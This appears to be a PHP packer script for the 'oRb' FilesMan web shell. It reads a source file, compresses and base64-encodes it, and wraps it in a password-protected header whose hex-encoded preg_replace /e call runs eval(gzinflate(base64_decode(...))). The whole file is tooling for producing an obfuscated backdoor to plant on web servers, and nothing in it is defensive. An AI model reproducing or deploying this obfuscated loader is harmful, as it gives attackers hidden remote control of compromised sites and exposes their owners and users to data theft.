<?php 
$header = '<?php # Web Shell by oRb 
$auth_pass = "63a9f0ea7bb98050796b649e85481845"; 
$color = "#df5"; 
$default_action = \'FilesMan\'; 
$default_use_ajax = true; 
$default_charset = \'Windows-1251\'; 
preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\''; 

$footer = '\'\x29\x29\x29\x3B",".");?>'; 

$content = php_strip_whitespace('unpack.php'); 
$content = trim(preg_replace('/<\?(php)?/', '', $content)); 
echo $header . base64_encode(gzdeflate($content, 9)) . $footer;
